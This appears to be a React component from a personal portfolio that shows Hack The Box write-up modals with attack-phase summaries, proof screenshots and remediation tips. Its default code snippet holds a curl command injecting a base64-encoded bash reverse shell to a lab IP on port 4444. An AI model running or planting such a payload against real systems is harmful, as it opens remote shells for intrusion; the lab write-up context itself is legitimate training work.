import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  X, 
  Copy, 
  Check, 
  Code, 
  Sparkles, 
  ShieldCheck, 
  Terminal, 
  Maximize2, 
  Calendar, 
  User, 
  Award, 
  CheckCircle2,
  ExternalLink,
  Cpu,
  Layers,
  Zap
} from 'lucide-react';
import { ProjectData } from './ProjectExactCard';

interface LReportModalProps {
  project: ProjectData;
  isOpen: boolean;
  onClose: () => void;
  voteCount?: number;
  hasVoted?: boolean;
  onVoteToggle?: (e: React.MouseEvent) => void;
}

export default function LReportModal({
  project,
  isOpen,
  onClose,
}: LReportModalProps) {
  const [copiedCode, setCopiedCode] = useState(false);
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const [showImageZoom, setShowImageZoom] = useState(false);

  if (!isOpen) return null;

  // Format category badge text
  const categoryBadge = project.subtitle?.toUpperCase() || project.location?.toUpperCase() || (project.platform ? `${project.platform.toUpperCase()} • ${project.os?.toUpperCase() || 'LINUX'}` : "CYBER LAB");
  const formattedDate = project.solvedDate || "September 2026";
  const isHTB = project.platform === 'Hack The Box' || !project.id.includes('packet');

  // Fallback code snippet if not directly provided
  const codeSnippet = project.codeSnippet || (isHTB 
    ? `# Automated exploit verification & interactive shell capture
curl -s -X POST http://${project.title.toLowerCase().replace(/\\s+/g, '')}.htb/api \\
  -H "User-Agent: Mozilla/5.0" \\
  -d "payload=\$(echo 'bash -i >& /dev/tcp/10.10.14.28/4444 0>&1' | base64)"`
    : `! Cisco IOS Enterprise Core Switch & Router Config
hostname Core-Router-01
interface GigabitEthernet0/0/0
 description Trunk to ASA Firewall
 ip address 192.168.10.1 255.255.255.252
 ip ospf 1 area 0
!
router ospf 1
 router-id 1.1.1.1
 network 10.0.0.0 0.255.255.255 area 0`);

  const codeSnippetTitle = project.codeSnippetTitle || (isHTB ? "Exploit Payload / CLI Execution Chain" : "Cisco IOS / CLI Configuration");

  const triggerToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 2400);
  };

  const handleCopyCode = () => {
    navigator.clipboard.writeText(codeSnippet);
    setCopiedCode(true);
    triggerToast("Exploit / Command snippet copied to clipboard!");
    setTimeout(() => setCopiedCode(false), 2000);
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[9999] flex items-center justify-center p-3 sm:p-6 bg-black/80 backdrop-blur-md overflow-y-auto">
        
        {/* Backdrop click to dismiss */}
        <div className="fixed inset-0 -z-10" onClick={onClose} />

        {/* Modal Container: Clean White Surface */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 15 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 15 }}
          transition={{ duration: 0.25, ease: [0.16, 1, 0.3, 1] }}
          className="relative w-full max-w-4xl bg-white text-gray-900 rounded-[2rem] shadow-2xl overflow-hidden my-auto border border-gray-100 flex flex-col max-h-[92vh]"
        >
          {/* Toast Notification */}
          <AnimatePresence>
            {toastMsg && (
              <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="absolute top-4 left-1/2 -translate-x-1/2 z-50 px-4 py-2 bg-neutral-900 text-amber-400 font-mono text-xs font-bold rounded-full shadow-lg flex items-center gap-2 border border-amber-500/30"
              >
                <Sparkles className="w-3.5 h-3.5 text-amber-400 animate-spin" />
                <span>{toastMsg}</span>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Modal Header Bar */}
          <div className="px-6 sm:px-9 pt-6 sm:pt-7 pb-4 flex items-center justify-between shrink-0 border-b border-gray-100 bg-gray-50/50">
            {/* Category Pill Tag & Date */}
            <div className="flex flex-wrap items-center gap-2.5">
              <span className="px-3 py-1 bg-amber-50 text-amber-800 font-mono font-bold text-[11px] sm:text-xs rounded-full tracking-wider uppercase border border-amber-200/80 flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5 text-amber-600" />
                <span>{project.platform || "Hack The Box"}</span>
              </span>

              {project.status && (
                <span className="px-2.5 py-1 bg-emerald-50 text-emerald-700 font-mono font-bold text-[11px] rounded-full border border-emerald-200 flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                  <span>{project.status.toUpperCase()}</span>
                </span>
              )}

              {project.os && (
                <span className="px-2.5 py-1 bg-zinc-100 text-zinc-700 font-mono font-medium text-[11px] rounded-full border border-zinc-200">
                  {project.os}
                </span>
              )}

              {project.difficulty && (
                <span className={`px-2.5 py-1 font-mono font-bold text-[11px] rounded-full border ${
                  project.difficulty === 'Easy' ? 'bg-green-50 text-green-700 border-green-200' :
                  project.difficulty === 'Medium' ? 'bg-orange-50 text-orange-700 border-orange-200' :
                  'bg-purple-50 text-purple-700 border-purple-200'
                }`}>
                  {project.difficulty}
                </span>
              )}
            </div>

            {/* Close Button */}
            <button
              onClick={onClose}
              className="w-9 h-9 rounded-full border border-gray-200/80 hover:bg-gray-200/80 flex items-center justify-center text-gray-600 hover:text-black transition-all cursor-pointer shrink-0"
              title="Close L-Report"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Modal Body Content */}
          <div className="px-6 sm:px-9 py-6 overflow-y-auto space-y-6 text-gray-700 font-sans leading-relaxed text-sm sm:text-base">
            
            {/* Title & Metadata Header */}
            <div>
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div>
                  <h1 className="text-2xl sm:text-3xl font-black text-gray-900 tracking-tight leading-tight font-sans">
                    {project.title} — Technical L-Report & Walkthrough
                  </h1>
                  <p className="text-xs sm:text-sm text-gray-500 font-mono mt-1 flex flex-wrap items-center gap-3">
                    <span className="flex items-center gap-1">
                      <User className="w-3.5 h-3.5 text-gray-400" />
                      Pwned by: <strong className="text-gray-900">{project.user || "TheXGentleman (Dananjaya)"}</strong>
                    </span>
                    <span className="text-gray-300">•</span>
                    <span className="flex items-center gap-1">
                      <Calendar className="w-3.5 h-3.5 text-gray-400" />
                      Solved: <strong className="text-gray-900">{formattedDate}</strong>
                    </span>
                    {project.machineRank && (
                      <>
                        <span className="text-gray-300">•</span>
                        <span className="flex items-center gap-1">
                          <Award className="w-3.5 h-3.5 text-amber-500" />
                          Rank: <strong className="text-gray-900">{project.machineRank}</strong>
                        </span>
                      </>
                    )}
                    {project.xpEarned && (
                      <>
                        <span className="text-gray-300">•</span>
                        <span className="text-emerald-600 font-bold">
                          +{project.xpEarned} XP
                        </span>
                      </>
                    )}
                  </p>
                </div>
              </div>

              {/* Tags row */}
              {project.tags && project.tags.length > 0 && (
                <div className="flex flex-wrap items-center gap-1.5 pt-3">
                  {project.tags.map((t, idx) => (
                    <span key={idx} className="px-2.5 py-0.5 bg-gray-100 text-gray-700 rounded-md text-[11px] font-mono font-medium border border-gray-200">
                      #{t}
                    </span>
                  ))}
                </div>
              )}
            </div>

            {/* Official Proof Screenshot Section */}
            {project.image && (
              <div className="rounded-2xl border border-gray-200 bg-gray-900 overflow-hidden shadow-md group relative">
                <div className="relative max-h-72 sm:max-h-80 overflow-hidden bg-black flex items-center justify-center cursor-pointer" onClick={() => setShowImageZoom(true)}>
                  <img
                    src={project.image}
                    alt={`${project.title} Solved Proof Screenshot`}
                    referrerPolicy="no-referrer"
                    className="w-full object-cover sm:object-contain max-h-72 sm:max-h-80 transition-transform duration-300 group-hover:scale-[1.02]"
                  />
                  <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-2 text-white font-mono text-xs font-bold pointer-events-none">
                    <Maximize2 className="w-4 h-4" />
                    <span>Click to Expand Full Screenshot Proof</span>
                  </div>
                  <div className="absolute top-3 left-3 bg-black/80 backdrop-blur-md text-emerald-400 border border-emerald-500/40 text-[10px] font-mono font-bold px-2.5 py-1 rounded-full flex items-center gap-1.5 shadow-sm">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span>VERIFIED PWN PROOF</span>
                  </div>
                  <div className="absolute bottom-3 right-3 bg-black/80 backdrop-blur-md text-gray-300 text-[10px] font-mono px-2 py-1 rounded">
                    Rank {project.machineRank || 'Solved'} • {formattedDate}
                  </div>
                </div>
              </div>
            )}

            {/* Executive Summary */}
            <div className="bg-amber-50/50 border border-amber-200/80 rounded-2xl p-4 sm:p-5 space-y-2">
              <div className="flex items-center gap-2 text-amber-900 font-bold text-xs uppercase font-mono tracking-wider">
                <Zap className="w-4 h-4 text-amber-600" />
                <span>Executive Threat Assessment</span>
              </div>
              <p className="text-gray-800 font-medium text-xs sm:text-sm leading-relaxed">
                {project.description}
              </p>
            </div>

            {/* Technical Attack Chain Walkthrough */}
            <div className="space-y-4">
              <h3 className="text-base sm:text-lg font-bold text-gray-900 font-sans tracking-tight flex items-center gap-2">
                <Layers className="w-4.5 h-4.5 text-neutral-700" />
                <span>Adversary Attack Vector Chain</span>
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Phase 1 */}
                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-2">
                  <div className="flex items-center gap-2">
                    <span className="w-6 h-6 rounded-full bg-black text-white text-[11px] font-mono font-bold flex items-center justify-center">
                      1
                    </span>
                    <h4 className="font-bold text-gray-900 text-xs sm:text-sm">
                      Recon & Surface Mapping
                    </h4>
                  </div>
                  <p className="text-xs text-gray-600 leading-relaxed font-sans">
                    {project.reconnaissance || "Comprehensive Nmap service discovery, directory brute-forcing, and identification of exposed endpoints and vulnerable software stacks."}
                  </p>
                </div>

                {/* Phase 2 */}
                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-2">
                  <div className="flex items-center gap-2">
                    <span className="w-6 h-6 rounded-full bg-amber-500 text-black text-[11px] font-mono font-bold flex items-center justify-center">
                      2
                    </span>
                    <h4 className="font-bold text-gray-900 text-xs sm:text-sm">
                      Initial Foothold
                    </h4>
                  </div>
                  <p className="text-xs text-gray-600 leading-relaxed font-sans">
                    {project.initialFoothold || "Targeted exploitation of input validation, authentication bypass, or deserialization weakness resulting in remote code execution (RCE)."}
                  </p>
                </div>

                {/* Phase 3 */}
                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-2">
                  <div className="flex items-center gap-2">
                    <span className="w-6 h-6 rounded-full bg-emerald-600 text-white text-[11px] font-mono font-bold flex items-center justify-center">
                      3
                    </span>
                    <h4 className="font-bold text-gray-900 text-xs sm:text-sm">
                      Privilege Escalation
                    </h4>
                  </div>
                  <p className="text-xs text-gray-600 leading-relaxed font-sans">
                    {project.privilegeEscalation || "Abuse of misconfigured SUID binaries, token impersonation, sudo misconfigurations, or kernel capabilities to elevate to root/SYSTEM."}
                  </p>
                </div>
              </div>
            </div>

            {/* Flags Verification Box */}
            <div className="border border-emerald-200 bg-emerald-50/40 rounded-xl p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-emerald-500 text-white flex items-center justify-center shrink-0 shadow-sm">
                  <Check className="w-5 h-5" />
                </div>
                <div>
                  <h4 className="text-xs sm:text-sm font-bold text-emerald-950 font-sans">
                    Official Flag Submissions Verified
                  </h4>
                  <p className="text-[11px] text-emerald-800/80 font-mono">
                    User Flag (user.txt) and Root Flag (root.txt) submitted and credited on Hack The Box
                  </p>
                </div>
              </div>
              <div className="flex items-center gap-2 shrink-0">
                <span className="px-3 py-1 bg-emerald-600 text-white font-mono font-bold text-xs rounded-full shadow-xs">
                  100% SOLVED
                </span>
              </div>
            </div>

            {/* Code Snippet Box */}
            <div className="bg-[#0e1118] rounded-2xl p-4 sm:p-5 font-mono text-xs sm:text-sm text-gray-200 shadow-xl border border-gray-800 space-y-3">
              {/* Top bar inside code block */}
              <div className="flex items-center justify-between text-gray-400 text-xs border-b border-gray-800/80 pb-2.5">
                <div className="flex items-center gap-2">
                  <Code className="w-4 h-4 text-amber-400" />
                  <span className="font-sans font-bold text-gray-300">{codeSnippetTitle}</span>
                </div>

                <button
                  onClick={handleCopyCode}
                  className="flex items-center gap-1.5 hover:text-white transition-colors cursor-pointer text-gray-400 font-sans text-xs px-2.5 py-1 rounded bg-white/5 hover:bg-white/10"
                >
                  {copiedCode ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                      <span className="text-emerald-400">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copy Snippet</span>
                    </>
                  )}
                </button>
              </div>

              {/* Code display */}
              <pre className="overflow-x-auto leading-relaxed text-gray-300 font-mono text-[11px] sm:text-xs pt-1 whitespace-pre-wrap">
{codeSnippet}
              </pre>
            </div>

            {/* Defensive Remediation & Hardening */}
            {project.remediation && project.remediation.length > 0 && (
              <div className="space-y-3 pt-2">
                <h3 className="text-base sm:text-lg font-bold text-gray-900 font-sans tracking-tight flex items-center gap-2">
                  <ShieldCheck className="w-4.5 h-4.5 text-emerald-600" />
                  <span>Defensive Remediation & Hardening Strategies</span>
                </h3>
                <ol className="space-y-2.5 text-gray-700 font-medium list-none pl-0">
                  {project.remediation.map((rec, idx) => (
                    <li key={idx} className="flex items-start gap-2.5 text-xs sm:text-sm bg-gray-50 border border-gray-200/80 rounded-xl p-3">
                      <span className="font-mono font-bold text-amber-600 shrink-0 mt-0.5">
                        [0{idx + 1}]
                      </span>
                      <span>{rec}</span>
                    </li>
                  ))}
                </ol>
              </div>
            )}

          </div>

          {/* Modal Footer */}
          <div className="px-6 sm:px-9 py-4 bg-gray-50 border-t border-gray-100 flex flex-wrap items-center justify-between gap-3 text-xs font-sans text-gray-500">
            <span>
              Author: <strong>Dananjaya Wickramarachchi</strong>
            </span>
            <div className="flex items-center gap-3">
              <button
                onClick={onClose}
                className="px-6 py-2 rounded-full bg-black text-white hover:bg-gray-800 font-bold transition-all cursor-pointer shadow-sm text-xs"
              >
                Close Report
              </button>
            </div>
          </div>

        </motion.div>
      </div>

      {/* Proof Screenshot Full Zoom Modal */}
      {showImageZoom && project.image && (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4 bg-black/95 backdrop-blur-xl" onClick={() => setShowImageZoom(false)}>
          <div className="relative max-w-5xl max-h-[90vh] flex flex-col items-center">
            <button
              onClick={() => setShowImageZoom(false)}
              className="absolute -top-12 right-0 px-4 py-1.5 rounded-full bg-white/10 hover:bg-white/20 text-white font-mono text-xs font-bold transition-all flex items-center gap-2 cursor-pointer"
            >
              <X className="w-4 h-4" />
              <span>Close Fullscreen</span>
            </button>
            <img
              src={project.image}
              alt={`${project.title} Proof`}
              referrerPolicy="no-referrer"
              className="max-w-full max-h-[85vh] object-contain rounded-xl border border-white/20 shadow-2xl"
            />
            <p className="text-white/80 font-mono text-xs mt-3 text-center">
              Official Hack The Box Solved Proof: {project.title} • User: {project.user || 'TheXGentleman'} • Date: {formattedDate}
            </p>
          </div>
        </div>
      )}
    </AnimatePresence>
  );
}
